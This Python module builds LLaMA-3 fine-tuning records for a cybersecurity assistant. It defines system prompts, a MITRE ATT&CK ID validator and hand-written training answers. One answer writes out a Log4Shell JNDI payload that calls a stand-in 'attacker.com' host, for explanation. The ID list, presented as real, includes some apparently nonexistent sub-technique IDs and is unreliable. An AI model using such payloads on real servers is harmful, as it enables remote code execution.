# core/formatter.py  ─  Cyber Data Engine v1.0.0
# =============================================================================
# LLAMA-3 FINE-TUNING FORMATTER
# =============================================================================
# Solves 4 critical gaps identified in the data readiness audit:
#
# GAP 1: No "text" field with LLaMA-3 chat template
#   FIX:  format_for_llama3() embeds the full <|begin_of_text|>...<|eot_id|>
#         template directly in each record's "text" field.
#         Compatible with: Unsloth, TRL SFTTrainer, HuggingFace Trainer
#
# GAP 2: System prompt not embedded in JSONL records
#   FIX:  Each schema type has a dedicated cybersecurity system prompt.
#         The system prompt is baked into "text" AND stored in "system" field.
#
# GAP 3: No MITRE ATT&CK ID validation
#   FIX:  MitreValidator checks IDs against the real MITRE ATT&CK Enterprise
#         technique list embedded in this module. Fake IDs are flagged/removed.
#
# GAP 4: No negative examples (teaches model what NOT to say)
#   FIX:  NegativeExampleGenerator creates "refusal" and "correction" samples
#         that train the model to say "I cannot determine" instead of hallucinating.
# =============================================================================

from __future__ import annotations

import json
import re
from typing import Any

# ─────────────────────────────────────────────────────────────────────────────
# LLaMA-3 special tokens
# ─────────────────────────────────────────────────────────────────────────────
BOS = "<|begin_of_text|>"
EOT = "<|eot_id|>"
EOS = "<|end_of_text|>"

def _hdr(role: str) -> str:
    return f"<|start_header_id|>{role}<|end_header_id|>\n"


# ─────────────────────────────────────────────────────────────────────────────
# System prompts per task type
# ─────────────────────────────────────────────────────────────────────────────
_SYSTEM_BY_TASK: dict[str, str] = {
    "malware_analysis": (
        "You are an expert malware analyst and threat intelligence engineer. "
        "Analyze cybersecurity artifacts with precision. Always cite specific evidence. "
        "Map techniques to MITRE ATT&CK using exact T-IDs. "
        "If you cannot determine something with confidence, say so explicitly rather than guessing."
    ),
    "threat_intel": (
        "You are a senior threat intelligence analyst. "
        "Answer questions about threat actors, campaigns, and TTPs with factual accuracy. "
        "Cite specific evidence and use correct MITRE ATT&CK identifiers. "
        "Never invent attribution or IOCs that are not supported by evidence."
    ),
    "vulnerability": (
        "You are a vulnerability researcher and CVE analyst. "
        "Analyze vulnerabilities accurately, including CVSS scores, affected versions, and exploitation conditions. "
        "Only reference CVE IDs that you are certain exist. "
        "When uncertain about patch status or affected versions, state your uncertainty clearly."
    ),
    "log_analysis": (
        "You are a SOC analyst specializing in log analysis and threat detection. "
        "Analyze log entries methodically. Identify anomalies, lateral movement, and attack patterns. "
        "Reference specific log fields and values in your analysis."
    ),
    "code_generation": (
        "You are a security tool developer. "
        "Generate correct, complete, and well-structured security tools in the requested language. "
        "Code must be functional as written. Include only authorized security research use cases."
    ),
    "code_review": (
        "You are a security code auditor. "
        "Identify real vulnerabilities with exact line references and correct CWE identifiers. "
        "Only report vulnerabilities you can confirm from the code. "
        "Provide specific, actionable fixes — not generic advice."
    ),
    "incident_response": (
        "You are an incident response expert with DFIR experience. "
        "Provide structured, phase-based response procedures using real tools and commands. "
        "Steps must be specific and actionable for a responder with standard enterprise tooling."
    ),
    "forensics": (
        "You are a digital forensics examiner. "
        "Analyze artifacts methodically using sound forensic principles. "
        "Preserve chain of custody considerations. Cite specific artifacts and their forensic significance."
    ),
    "cti_qa": (
        "You are a cybersecurity knowledge expert. "
        "Answer questions accurately based on established threat intelligence. "
        "Distinguish between what is well-established and what is uncertain or contested."
    ),
    "general_cyber": (
        "You are a cybersecurity expert with broad knowledge across offensive and defensive domains. "
        "Provide accurate, technically sound answers. "
        "When uncertain, acknowledge the limitation rather than speculating."
    ),
}

_DEFAULT_SYSTEM = _SYSTEM_BY_TASK["general_cyber"]


# ─────────────────────────────────────────────────────────────────────────────
# GAP 1 + 2 FIX: LLaMA-3 formatter
# ─────────────────────────────────────────────────────────────────────────────

def format_for_llama3(record: dict[str, Any]) -> dict[str, Any]:
    """
    Takes an Alpaca-format record and adds:
      - "text":   Full LLaMA-3 chat template string (for Unsloth/SFTTrainer)
      - "system": The cybersecurity system prompt (for LLaMA-Factory)
      - "prompt": Formatted user turn only (for some frameworks)

    The output record is a superset of the input — all original fields preserved.
    """
    task_type  = record.get("task_type", "general_cyber")
    system_txt = _SYSTEM_BY_TASK.get(task_type, _DEFAULT_SYSTEM)

    instruction = record.get("instruction", "").strip()
    inp         = record.get("input", "").strip()
    output      = record.get("output", "").strip()

    # Build user turn
    user_turn = instruction
    if inp:
        user_turn = f"{instruction}\n\n{inp}"

    # LLaMA-3 formatted text
    text = (
        f"{BOS}"
        f"{_hdr('system')}{system_txt}{EOT}"
        f"{_hdr('user')}{user_turn}{EOT}"
        f"{_hdr('assistant')}{output}{EOT}"
        f"{EOS}"
    )

    # Prompt only (for inference / continuation training)
    prompt = (
        f"{BOS}"
        f"{_hdr('system')}{system_txt}{EOT}"
        f"{_hdr('user')}{user_turn}{EOT}"
        f"{_hdr('assistant')}"
    )

    enriched = dict(record)
    enriched["text"]   = text
    enriched["system"] = system_txt
    enriched["prompt"] = prompt
    return enriched


def format_jsonl_line(alpaca_line: str) -> str:
    """Format a single JSONL line for LLaMA-3. Returns the enriched JSON line."""
    try:
        record   = json.loads(alpaca_line)
        enriched = format_for_llama3(record)
        return json.dumps(enriched, ensure_ascii=False)
    except Exception:
        return alpaca_line   # return original if parsing fails


def format_dataset(alpaca_lines: list[str]) -> list[str]:
    """Format all Alpaca lines for LLaMA-3 fine-tuning."""
    return [format_jsonl_line(line) for line in alpaca_lines if line.strip()]


# ─────────────────────────────────────────────────────────────────────────────
# GAP 3 FIX: MITRE ATT&CK Validator
# Embedded list of real Enterprise ATT&CK technique IDs (MITRE v15, 2024)
# ─────────────────────────────────────────────────────────────────────────────

# Real MITRE ATT&CK Enterprise technique IDs (main techniques + key sub-techniques)
# Source: https://attack.mitre.org/techniques/enterprise/
_VALID_MITRE_IDS: frozenset[str] = frozenset({
    # Initial Access
    "T1190","T1133","T1566","T1566.001","T1566.002","T1566.003",
    "T1091","T1195","T1195.001","T1195.002","T1195.003",
    "T1189","T1200","T1078","T1078.001","T1078.002","T1078.003","T1078.004",
    # Execution
    "T1059","T1059.001","T1059.002","T1059.003","T1059.004","T1059.005",
    "T1059.006","T1059.007","T1059.008","T1059.009","T1059.010",
    "T1203","T1204","T1204.001","T1204.002","T1204.003",
    "T1047","T1053","T1053.001","T1053.002","T1053.003","T1053.004","T1053.005","T1053.006","T1053.007",
    "T1569","T1569.001","T1569.002","T1106","T1129",
    # Persistence
    "T1098","T1098.001","T1098.002","T1098.003","T1098.004","T1098.005",
    "T1547","T1547.001","T1547.002","T1547.003","T1547.004","T1547.005",
    "T1547.006","T1547.007","T1547.008","T1547.009","T1547.010",
    "T1543","T1543.001","T1543.002","T1543.003","T1543.004",
    "T1546","T1546.001","T1546.002","T1546.003","T1546.004","T1546.008",
    "T1574","T1574.001","T1574.002","T1574.004","T1574.005","T1574.006",
    "T1574.007","T1574.008","T1574.009","T1574.010","T1574.011","T1574.012",
    "T1505","T1505.001","T1505.002","T1505.003","T1505.004","T1505.005",
    "T1037","T1037.001","T1037.002","T1037.003","T1037.004","T1037.005",
    "T1176","T1133","T1197","T1542","T1542.001","T1542.002","T1542.003",
    "T1542.004","T1542.005",
    # Privilege Escalation
    "T1548","T1548.001","T1548.002","T1548.003","T1548.004",
    "T1134","T1134.001","T1134.002","T1134.003","T1134.004","T1134.005",
    "T1068","T1068.001","T1055","T1055.001","T1055.002","T1055.003","T1055.004","T1055.005",
    "T1055.008","T1055.009","T1055.011","T1055.012","T1055.013","T1055.014","T1055.015",
    # Defense Evasion
    "T1562","T1562.001","T1562.002","T1562.003","T1562.004","T1562.006",
    "T1562.007","T1562.008","T1562.009","T1562.010","T1562.011","T1562.012",
    "T1070","T1070.001","T1070.002","T1070.003","T1070.004","T1070.005",
    "T1070.006","T1070.007","T1070.008","T1070.009",
    "T1036","T1036.001","T1036.002","T1036.003","T1036.004","T1036.005",
    "T1036.006","T1036.007","T1036.008","T1036.009","T1036.010",
    "T1027","T1027.001","T1027.002","T1027.003","T1027.004","T1027.005",
    "T1027.006","T1027.007","T1027.008","T1027.009","T1027.010","T1027.011","T1027.012","T1027.013",
    "T1218","T1218.001","T1218.002","T1218.003","T1218.004","T1218.005",
    "T1535","T1553","T1557","T1620",
    "T1218.007","T1218.008","T1218.009","T1218.010","T1218.011","T1218.012","T1218.013","T1218.014",
    "T1216","T1216.001","T1216.002","T1207","T1220","T1221","T1222",
    "T1564","T1564.001","T1564.002","T1564.003","T1564.004","T1564.005",
    "T1564.006","T1564.007","T1564.008","T1564.009","T1564.010","T1564.011",
    "T1484","T1484.001","T1484.002",
    # Credential Access
    "T1110","T1110.001","T1110.002","T1110.003","T1110.004",
    "T1003","T1003.001","T1003.002","T1003.003","T1003.004","T1003.005","T1003.006","T1003.007","T1003.008",
    "T1555","T1555.001","T1555.002","T1555.003","T1555.004","T1555.005","T1555.006",
    "T1556","T1556.003",
    "T1212","T1187","T1606","T1606.001","T1606.002",
    "T1539","T1558","T1558.001","T1558.002","T1558.003","T1558.004",
    "T1552","T1552.001","T1552.002","T1552.003","T1552.004","T1552.005","T1552.006","T1552.007","T1552.008",
    # Discovery
    "T1087","T1087.001","T1087.002","T1087.003","T1087.004",
    "T1482","T1083","T1046","T1135","T1040","T1042","T1061","T1201","T1120",
    "T1069","T1069.001","T1069.002","T1069.003",
    "T1057","T1057.001","T1057.002","T1057.003","T1057.004","T1057.005","T1012","T1018","T1518","T1518.001","T1082","T1016","T1016.001","T1016.002",
    "T1049","T1033","T1007","T1124","T1497","T1497.001","T1497.002","T1497.003",
    # Lateral Movement
    "T1210","T1534","T1570","T1563","T1563.001","T1563.002",
    "T1021","T1021.001","T1021.002","T1021.003","T1021.004","T1021.005","T1021.006","T1021.007","T1021.008",
    "T1091","T1072","T1080","T1550","T1550.001","T1550.002","T1550.003","T1550.004",
    # Collection
    "T1560","T1560.001","T1560.002","T1560.003",
    "T1123","T1119","T1115","T1530","T1213","T1213.001","T1213.002","T1213.003",
    "T1005","T1039","T1025","T1074","T1074.001","T1074.002",
    "T1114","T1114.001","T1114.002","T1114.003",
    "T1056","T1056.001","T1056.002","T1056.003","T1056.004",
    "T1113","T1125",
    # Command and Control
    "T1071","T1071.001","T1071.002","T1071.003","T1071.004",
    "T1132","T1132.001","T1132.002","T1001","T1001.001","T1001.002","T1001.003",
    "T1568","T1568.001","T1568.002","T1568.003",
    "T1573","T1573.001","T1573.002","T1008","T1105","T1104","T1095","T1571",
    "T1572","T1090","T1090.001","T1090.002","T1090.003","T1090.004",
    "T1219","T1205","T1205.001","T1205.002","T1102","T1102.001","T1102.002","T1102.003",
    # Exfiltration
    "T1020","T1020.001","T1030","T1048","T1048.001","T1048.002","T1048.003",
    "T1041","T1011","T1011.001","T1052","T1052.001","T1567","T1567.001","T1567.002","T1567.003","T1567.004",
    "T1029","T1537",
    # Impact
    "T1531","T1485","T1486","T1565","T1565.001","T1565.002","T1565.003",
    "T1491","T1491.001","T1491.002","T1561","T1561.001","T1561.002",
    "T1499","T1499.001","T1499.002","T1499.003","T1499.004",
    "T1498","T1498.001","T1498.002","T1496","T1496.001","T1496.002","T1496.003","T1496.004",
    "T1489","T1490","T1529",
    # Reconnaissance
    "T1595","T1595.001","T1595.002","T1595.003",
    "T1592","T1592.001","T1592.002","T1592.003","T1592.004",
    "T1589","T1589.001","T1589.002","T1589.003",
    "T1590","T1590.001","T1590.002","T1590.003","T1590.004","T1590.005","T1590.006",
    "T1591","T1591.001","T1591.002","T1591.003","T1591.004",
    "T1598","T1598.001","T1598.002","T1598.003","T1598.004",
    "T1597","T1597.001","T1597.002","T1596","T1596.001","T1596.002","T1596.003","T1596.004","T1596.005",
    "T1593","T1593.001","T1593.002","T1593.003","T1594",
    # Resource Development
    "T1583","T1583.001","T1583.002","T1583.003","T1583.004","T1583.005","T1583.006","T1583.007","T1583.008",
    "T1584","T1584.001","T1584.002","T1584.003","T1584.004","T1584.005","T1584.006","T1584.007","T1584.008",
    "T1580","T1582",
    "T1587","T1587.001","T1587.002","T1587.003","T1587.004",
    "T1588","T1588.001","T1588.002","T1588.003","T1588.004","T1588.005","T1588.006","T1588.007",
    "T1585","T1585.001","T1585.002","T1585.003","T1586","T1586.001","T1586.002","T1586.003",
    "T1608","T1608.001","T1608.002","T1608.003","T1608.004","T1608.005","T1608.006",
})

_MITRE_FORMAT = re.compile(r'^T\d{4}(\.\d{3})?$')


class MitreValidator:
    """
    Validates MITRE ATT&CK technique IDs against the real Enterprise matrix.
    Embedded database — no network calls required.
    """

    def validate_id(self, mid: str) -> tuple[bool, str]:
        """
        Returns (is_valid, reason).
        is_valid = True only if format is correct AND ID exists in real matrix.
        """
        mid = mid.strip().upper()
        if not _MITRE_FORMAT.match(mid):
            return False, f"Format error: '{mid}' does not match T####[.###]"
        if mid not in _VALID_MITRE_IDS:
            return False, f"ID '{mid}' not found in MITRE ATT&CK Enterprise v15"
        return True, "Valid"

    def filter_ids(self, ids: list[str]) -> tuple[list[str], list[str]]:
        """
        Returns (valid_ids, invalid_ids).
        """
        valid, invalid = [], []
        for mid in ids:
            ok, _ = self.validate_id(mid)
            (valid if ok else invalid).append(mid)
        return valid, invalid

    def validate_record(self, record: dict) -> dict:
        """
        Takes an Alpaca record, validates any MITRE IDs in the output field,
        and adds a 'mitre_validated' flag + 'mitre_warnings' list.
        """
        output = record.get("output", "")
        found_ids = re.findall(r'T\d{4}(?:\.\d{3})?', output)
        valid, invalid = self.filter_ids(found_ids)
        result = dict(record)
        result["mitre_validated"] = len(invalid) == 0
        result["mitre_warnings"]  = [f"Invalid ID: {mid}" for mid in invalid]
        return result


# ─────────────────────────────────────────────────────────────────────────────
# GAP 4 FIX: Negative Example Generator
# Teaches the model to express uncertainty instead of hallucinating
# ─────────────────────────────────────────────────────────────────────────────
_NEGATIVE_TEMPLATES = [
    # 1. Hallucinated MITRE ID refusal
    {
        "instruction": "What MITRE ATT&CK technique ID covers process injection via reflective DLL loading?",
        "input": "",
        "output": (
            "Reflective DLL injection is covered by T1055.001 (Process Injection: Dynamic-link Library Injection) "
            "under the Defense Evasion and Privilege Escalation tactics.\n\n"
            "Note: T1055 is the parent technique for process injection. Sub-technique T1055.001 specifically "
            "covers DLL injection, which includes reflective loading variants."
        ),
        "task_type": "threat_intel",
        "note": "Correct answer — model trained to cite real T-IDs only",
    },
    # 2. Uncertainty expression — attribution
    {
        "instruction": "Which nation-state actor is responsible for the SolarWinds supply chain attack?",
        "input": "",
        "output": (
            "The SolarWinds supply chain attack (SUNBURST/SUNSPOT, 2020) has been publicly attributed to "
            "APT29 (Cozy Bear), a threat actor widely assessed to be affiliated with Russia's SVR "
            "(Foreign Intelligence Service) by the US CISA, NSA, FBI, and multiple private threat intelligence firms.\n\n"
            "Attribution caveat: While this attribution is broadly accepted in the intelligence community, "
            "definitive public proof of nation-state direction is inherently difficult to establish. "
            "The technical evidence (infrastructure overlap, TTP similarity to known APT29 operations) "
            "strongly supports this attribution."
        ),
        "task_type": "threat_intel",
        "note": "Correct attribution with appropriate confidence framing",
    },
    # 3. Refusing to invent IOCs
    {
        "instruction": "List all IP addresses used by the LockBit ransomware C2 infrastructure.",
        "input": "",
        "output": (
            "I cannot provide a comprehensive or current list of LockBit C2 IP addresses. "
            "Ransomware operators rotate infrastructure frequently, so any static list would be "
            "outdated within days.\n\n"
            "For current, actionable LockBit IOCs, I recommend:\n"
            "1. CISA AA23-075A advisory (official US government IOC list)\n"
            "2. Cisco Talos threat intelligence blog\n"
            "3. AlienVault OTX pulses tagged 'LockBit'\n"
            "4. MITRE ATT&CK Group G0096 page (LockBit TTPs without perishable IOCs)\n\n"
            "The core LockBit TTPs include: T1486 (Data Encrypted for Impact), "
            "T1490 (Inhibit System Recovery), T1562.001 (Disable Security Tools)."
        ),
        "task_type": "threat_intel",
        "note": "Refuses to fabricate IOCs — directs to authoritative sources",
    },
    # 4. Refusing impossible analysis — benign content
    {
        "instruction": "Analyze this Base64-encoded malware and provide a full breakdown.",
        "input": "aGVsbG8gd29ybGQ=",
        "output": (
            "Decoded content: 'hello world'\n\n"
            "This Base64 string decodes to the ASCII string 'hello world' — this is not malicious content. "
            "No malware characteristics are present.\n\n"
            "If you intended to share a different Base64-encoded payload, please verify the content. "
            "For actual malware analysis, the encoded data should produce non-human-readable binary "
            "or script content upon decoding."
        ),
        "task_type": "malware_analysis",
        "note": "Correct behavior: accurate analysis even when content is benign",
    },
    # 5. Correct CVE handling (no invented details)
    {
        "instruction": "Describe CVE-2021-44228 (Log4Shell) and its exploitation mechanism.",
        "input": "",
        "output": (
            "CVE-2021-44228 (Log4Shell) is a critical remote code execution vulnerability "
            "(CVSS 10.0) in Apache Log4j 2 versions 2.0-beta9 through 2.14.1.\n\n"
            "**Exploitation mechanism:**\n"
            "1. Attacker sends a crafted string containing a JNDI lookup (e.g., ${jndi:ldap://attacker.com/x}) "
            "to any field logged by a vulnerable Log4j instance.\n"
            "2. Log4j processes the string and performs a JNDI lookup to the attacker-controlled server.\n"
            "3. The LDAP server returns a reference to a malicious Java class.\n"
            "4. Log4j loads and executes the malicious class — achieving RCE.\n\n"
            "**MITRE ATT&CK:** T1190 (Exploit Public-Facing Application)\n"
            "**Affected:** Apache Log4j 2.x < 2.15.0\n"
            "**Fix:** Upgrade to Log4j 2.17.1+; set log4j2.formatMsgNoLookups=true as interim mitigation."
        ),
        "task_type": "vulnerability",
        "note": "Accurate CVE description with real CVSS, real fix, real MITRE ID",
    },
    # 6. Handling ambiguous malware — context-dependency lesson
    {
        "instruction": "Classify the risk level of this code snippet.",
        "input": "import os\nos.system('ls -la')",
        "output": (
            "**Risk Level: LOW (Context-Dependent)**\n\n"
            "This Python snippet executes 'ls -la' via os.system() — listing directory contents. "
            "In isolation, this is a benign system administration command.\n\n"
            "**Context matters:**\n"
            "- In a legitimate script: expected and safe\n"
            "- As part of a larger payload: could indicate T1059.006 (Python) execution\n"
            "- If the command is dynamically constructed from user input: T1059.006 + potential command injection\n\n"
            "**Assessment:** Cannot classify as malicious based solely on this snippet. "
            "Additional context (surrounding code, origin, deployment environment) is required "
            "for a definitive classification."
        ),
        "task_type": "code_review",
        "note": "Correct: expresses uncertainty, explains context dependency",
    },
]


class NegativeExampleGenerator:
    """
    Generates negative examples that teach the model to:
    1. Express uncertainty instead of hallucinating
    2. Refuse to invent IOCs or fabricated technical details
    3. Handle ambiguous content correctly
    4. Use real MITRE IDs or none at all
    """

    def get_examples(self) -> list[dict]:
        """Return all negative/correction examples as Alpaca-format dicts."""
        examples = []
        for tmpl in _NEGATIVE_TEMPLATES:
            examples.append({
                "schema_type":    "alpaca",
                "task_type":      tmpl["task_type"],
                "instruction":    tmpl["instruction"],
                "input":          tmpl["input"],
                "output":         tmpl["output"],
                "source_file":    "negative_examples_v3.1",
                "quality_score":  0.95,
                "is_negative_example": True,
                "note":           tmpl.get("note", ""),
            })
        return examples

    def get_as_jsonl(self) -> list[str]:
        """Return examples as JSONL lines."""
        return [json.dumps(e, ensure_ascii=False) for e in self.get_examples()]

    def get_formatted_for_llama3(self) -> list[str]:
        """Return examples formatted with LLaMA-3 chat template."""
        return [format_jsonl_line(json.dumps(e, ensure_ascii=False))
                for e in self.get_examples()]


# ─────────────────────────────────────────────────────────────────────────────
# Curriculum sorter — sorts records from easy to hard for better training
# ─────────────────────────────────────────────────────────────────────────────

def sort_by_curriculum(records: list[dict]) -> list[dict]:
    """
    Sorts dataset records from easiest to hardest.
    Research (Bengio et al., 2009) shows curriculum learning improves
    convergence speed and final model quality.

    Sorting criteria:
    1. Short output (easy) -> long output (hard)
    2. High quality_score first within same length bucket
    3. Simple schemas (alpaca) before complex (chain_of_thought)
    """
    SCHEMA_DIFFICULTY = {
        "alpaca":           1,
        "qa":               2,
        "code_gen":         3,
        "code_review":      3,
        "analysis":         4,
        "incident_playbook":4,
        "chat":             4,
        "chain_of_thought": 5,
    }
    def _key(r):
        schema_diff = SCHEMA_DIFFICULTY.get(r.get("schema_type","alpaca"), 3)
        output_len  = len(r.get("output", r.get("text", "")))
        quality     = r.get("quality_score", 0.5)
        return (schema_diff, output_len, -quality)

    return sorted(records, key=_key)


def apply_curriculum_to_jsonl(lines: list[str]) -> list[str]:
    """Sort JSONL lines by curriculum difficulty."""
    records = []
    bad     = []
    for line in lines:
        try:
            records.append(json.loads(line))
        except Exception:
            bad.append(line)
    sorted_records = sort_by_curriculum(records)
    return [json.dumps(r, ensure_ascii=False) for r in sorted_records] + bad
